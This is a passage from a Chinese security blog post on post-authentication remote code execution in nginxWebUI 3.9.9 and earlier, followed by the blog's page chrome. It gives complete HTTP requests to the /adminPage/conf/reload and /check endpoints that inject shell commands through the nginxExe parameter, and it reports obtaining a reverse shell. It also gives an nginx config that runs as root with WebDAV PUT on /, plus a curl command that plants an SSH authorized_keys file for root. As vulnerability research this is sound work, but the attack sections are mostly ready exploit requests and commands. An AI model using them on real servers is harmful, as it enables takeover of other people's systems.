class="hljs-number">1</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarygQGA2ci4A6Ii4KAG--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="0x04-reload-代码执行"><a href="#0x04-reload-代码执行" class="headerlink" title="0x04 reload 代码执行"></a>0x04 reload 代码执行</h2><p>com.cym.controller.adminPage.ConfController#reload</p>
+<p><img src="image-20240330002357857.png" srcset="/img/loading.gif" lazyload alt="image-20240330002357857"></p>
+<p>没什么好说的，全可控，没有过滤。然后拼接，进行执行。</p>
+<p>cn.hutool.core.util.RuntimeUtil#exec(java.lang.String…)</p>
+<p><img src="image-20240330002434052.png" srcset="/img/loading.gif" lazyload alt="image-20240330002434052"></p>
+<p>最后会调用到这里，和上面不同，这里是代码执行</p>
+<h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p>生成java格式代码执行</p>
+<p><img src="image-20240330002657116.png" srcset="/img/loading.gif" lazyload alt="image-20240330002657116"></p>
+<p><img src="image-20240330002622189.png" srcset="/img/loading.gif" lazyload alt="image-20240330002622189"></p>
+<p><img src="image-20240330002803528.png" srcset="/img/loading.gif" lazyload alt="image-20240330002803528"></p>
+<p><img src="image-20240330002630229.png" srcset="/img/loading.gif" lazyload alt="image-20240330002630229"></p>
+<p>成功获取shell</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/reload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>131<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">nginxP<span class="hljs-attr">ath</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>nginxE<span class="hljs-attr">xe</span><span class="hljs-operator">=</span>cmd<span class="hljs-variable">&amp;</span>nginxD<span class="hljs-attr">ir</span><span class="hljs-operator">=</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="0x05-check-代码执行"><a href="#0x05-check-代码执行" class="headerlink" title="0x05 check 代码执行"></a>0x05 check 代码执行</h2><p>com.cym.controller.adminPage.ConfController#check</p>
+<p><img src="image-20240330003342822.png" srcset="/img/loading.gif" lazyload alt="image-20240330003342822"></p>
+<p>同理，全可控，且没过滤</p>
+<p>最后会走到execforstr(),然后造成代码执行</p>
+<p><img src="image-20240330003420470.png" srcset="/img/loading.gif" lazyload alt="image-20240330003420470"></p>
+<p><img src="image-20240330003524958.png" srcset="/img/loading.gif" lazyload alt="image-20240330003524958"></p>
+<p>我们只需要对nginxExe赋值就行，json保持默认，其余不填即可</p>
+<h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20240330002657116.png" srcset="/img/loading.gif" lazyload alt="image-20240330002657116"></p>
+<p>生成java反弹payload</p>
+<p><img src="image-20240330003729310.png" srcset="/img/loading.gif" lazyload alt="image-20240330003729310"></p>
+<p>成功rce</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/check</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>495<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-ini"><span class="hljs-attr">nginxPath</span>=&amp;nginxExe=bash+-c+cmd</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="0x06-利用nginx—conf配置rce"><a href="#0x06-利用nginx—conf配置rce" class="headerlink" title="0x06  利用nginx—conf配置rce"></a>0x06  利用nginx—conf配置rce</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">user  root;<br>worker_processes 4;<br>pid /tmp/nginx.pid;<br><br>events &#123;<br>    worker_connections 768;<br>&#125;<br><br>http &#123;<br>    server &#123;<br>        listen 1337;<br>        root /;<br>        autoindex on;<br>    <br>        location / &#123;<br>            dav_methods PUT;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="image-20240417215333266.png" srcset="/img/loading.gif" lazyload alt="image-20240417215333266"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X PUT -T ~/Downloads/authorized_keys  http://192.168.108.137:1337/root/.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="image-20240417215410337.png" srcset="/img/loading.gif" lazyload alt="image-20240417215410337"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>nginxwebui&lt;=3.9.9后台rce</div>
+      <div>https://unam4.github.io/2024/04/06/nginxwebui-3-9-9后台rce/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/18/aj-report-%E4%BA%8C%E6%AC%A1%E5%B0%B1%E4%B8%9A/" title="aj-report 二次就业">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">aj-report 二次就业</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/01/apache-cayenne%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="apache-cayenne代码审计">
+                        <span class="hidden-mobile">apache-cayenne代码审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'unam4/unam4-commect');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
